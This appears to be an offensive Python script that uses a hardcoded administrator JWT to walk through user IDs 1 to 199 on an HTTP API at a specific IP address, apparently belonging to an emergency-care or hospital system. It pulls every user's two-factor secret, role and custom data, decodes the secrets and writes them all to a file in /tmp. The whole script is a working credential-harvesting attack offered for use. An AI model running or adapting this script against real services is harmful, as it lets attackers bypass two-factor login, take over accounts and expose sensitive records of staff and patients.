#!/usr/bin/env python3
"""
Dump token2FA + customData + Role for all 200 users (1-199) using admin2 JWT
"""
import json
import urllib.request
import urllib.error
import base64

JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiYWRtaW4yIiwicm9sZSI6IkFETUlOIiwidXNlciI6eyJuYW1lIjoiYWRtaW4yIiwiYWNjb3VudCI6ImFkbWluMiIsImV4dEFjY291bnQiOm51bGwsImlzTG9jYWwiOnRydWUsImN1c3RvbURhdGEiOm51bGwsInJvbGUiOiJBRE1JTiJ9LCJwZXJtaXNzaW9ucyI6WyJFUENSX1NFUlZJQ0UiLCJFUENSX1BBR0VfQlVMTEVUSU4iLCJFUENSX1BBR0VfUkVTT1VSQ0VNQU5BR0VNRU5UIiwiRVBDUl9QQUdFX01PTklUT1IiLCJFUENSX1BBR0VfQ0FTRUxJU1QiLCJFUENSX1BBR0VfQ0FTRURFVEFJTCIsIkVQQ1JfUEFHRV9DQVNFREVUQUlMUFJJTlQiLCJFUENSX1BBR0VfTUNJTElTVCIsIkVQQ1JfUEFHRV9NQ0lERVRBSUwiLCJFUENSX1BBR0VfQlJBTkNIIiwiRVBDUl9QQUdFX0JSQU5DSEdST1VQIiwiRVBDUl9QQUdFX0hPU1BJVEFMIiwiRVBDUl9QQUdFX0RFVklDRSIsIkVQQ1JfUEFHRV9BTUJVTEFOQ0UiLCJFUENSVFBBR0VfRU1UIiwiRVBDUl9QQUdFX0VNVExFVkVMIiwiRVBDUl9QQUdFX0VNVFRSQUlOSU5HIiwiRVBDUl9QQUdFX0VNVFRSQUlOSU5HVFlQRSIsIkVQQ1JfUEFHRV9TVEFUIiwiRVBDUl9QQUdFX0lTU1VFVFJBQ0tJTkciLCJFUENSX1BBR0VfQ0FTRVNJTVVMQVRPUiIsIkVQQ1JfQ0FTRVJFQ09SRF9SRUFEIiwiRVBDUl9DQVNFUkVDT1JEX1VQREFURSIsIkVQQ1JfQ0FTRVJFQ09SRF9DUkVBVEUiLCJFUENSX0NBU0VSRUNPUkRfREVMRVRFIiwiSE9TUElUQUxfUEFHRV9IT1NQSVRBTCIsIkhPU1BJVEFMX1BBR0VfSE9TUElUQUxDQVBBQklMSVRZIiwiSE9TUElUQUxfUEFHRV9CQUNLVFJBQ0tJTkciLCJIT1NQSVRBTF9QQUdFX0hPU1BJVEFMQ0FQQUJJTElUWUxJU1QiLCJET0NUT1JfUEFHRV9ET0NUT1IiLCJET0NUT1JfUEFHRV9TQ0hFRFVMRSIsIkRPQ1RPUl9JTlNUUlVDVF9BTEwiLCJNT05JVE9SX0FMTCIsIkVQQ1JfT0ZGSUNJQUxDQVNFIiwiRVBDUl9DQVNFX1NDT1JFIiwiQVVUSF9ST0xFIiwiQVVUSF9VU0VSIiwiQVVUSF9QRVJNIiwiQVVUSF9VU0VSX0FMTCIsIkRPQ1RPUl9URVNUX1BVU0giLCJFUENSX1BBR0VfU1VQUExJRVNDT05GSUciLCJFUENSX1BBR0VfU1VQUExJRVNRVUVSWSIsIkVQQ1JfUEFHRV9TVVBQTElFU1NUT0NLSU4iLCJFUENSX1BBR0VfU1VQUExJRVNTVE9DS09VVCIsIkVQQ1JfUEFHRV9TVVBQTElFU1JFUVVFU1QiLCJFUENSX1BBR0VfU1VQUExJRVNJU1NVQU5DRSIsIkVQQ1JfUEFHRV9TVVBQTElFU0lOVkVOVE9SWSIsIkVQQ1JfUEFHRV9TVVBQTElFUyIsIkhPU1BJVEFMX1BBR0VfRElTUEFUQ0giLCJFUENSX0RPQ1RPUl9PUkRFUiIsIkVQQ1JfUEFHRV9TVVBQTElFU1NUQVRTIiwiSE9TUElUQUxfUEFHRV9DQVNFTElTVCIsIkhPU1BJVEFMX0hPU1BJVEFMX0RFTEVURSIsIkVQQ1JfQlJBTkNIIiwiRVBDUl9QQUdFX1NUQVRfTUFOQUdFUiIsIkhPU1BJVEFMX1BBR0VfU1RBVCIsIk1DSV9VUERBVEVfQ0FTRSIsIk1DSV9UUklBR0UiLCJNQ0lfVFJFQVRNRU5UIiwiTUNJX0RJU1BBVENIIiwiTUNJX0VNVCIsIk1DSV9BU1NJR05fUk9MRSIsIk1DSV9WSUVXX1BDUiIsIk1DSV9ERUxFR0FURSIsIkVQQ1JfUEFHRV9DSEFOR0VIT1MiLCJFUENSX1BBR0VfT0hDQUNBU0VMSVNUIiwiQVVUSF9SRVNFVF9QQVNTV09SRCIsIkFVVEhfUkVTRVRfTE9HSU4iLCJBVVRIX0RFTF9VU0VSIiwiQVVUSF8yRkEiLCJFUENSX1BBR0VfQkFDS1RSQUNLX0FETUlOIl0sImlhdCI6MTc4ODA4ODQyMywiZXhwIjoxNzg4MjYxMjIzfQ.-3sgbFVVVOAcKYnjQ_ndJKe3BW5aYzwOBwMtflpmNbQ"

def base32_decode_safe(s):
    if not s: return None
    try:
        # base32 requires padding
        padded = s.upper()
        pad = (8 - len(padded) % 8) % 8
        padded += '=' * pad
        return base64.b32decode(padded).decode('utf-8', errors='replace')
    except: return None

results = []
for uid in range(1, 200):
    url = f"http://35.234.50.28:3400/users/{uid}"
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {JWT}"})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read().decode('utf-8', errors='replace')
            if r.status == 200 and body and body != "[]":
                data = json.loads(body)
                if isinstance(data, dict) and 'id' in data:
                    t2fa = data.get('token2FA')
                    t2fa_decoded = base32_decode_safe(t2fa) if t2fa else None
                    role_obj = data.get('Role')
                    role_name = role_obj.get('name') if isinstance(role_obj, dict) else None
                    results.append({
                        'id': data.get('id'),
                        'account': data.get('account'),
                        'name': data.get('name'),
                        'role': role_name,
                        'customData': data.get('customData'),
                        'use2FA': data.get('use2FA'),
                        'token2FA': t2fa,
                        'token2FA_decoded': t2fa_decoded,
                        'lastLoginAt': data.get('lastLoginAt'),
                        'disabled': data.get('disabled')
                    })
                    # Show all token2FA non-null entries
                    if t2fa:
                        print(f"[*] id={uid} {data.get('account'):20s} {data.get('name'):30s} role={role_name:15s} use2FA={data.get('use2FA')} token2FA={t2fa}  decoded={t2fa_decoded!r}")
    except urllib.error.HTTPError as e:
        if e.code != 404:
            print(f"[?] /users/{uid} -> {e.code}")
    except: pass

print(f"\nTotal users: {len(results)}")
with open("/tmp/users_token2fa_dump.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=False)

# Print only the token2FA carrying ones
print("\n=== ALL USERS WITH token2FA ENABLED ===")
for r in results:
    if r.get('token2FA'):
        print(f"id={r['id']:3d} {r['account']:20s} {r['name']:30s} role={r['role']:15s} t2fa_decoded={r['token2FA_decoded']!r}")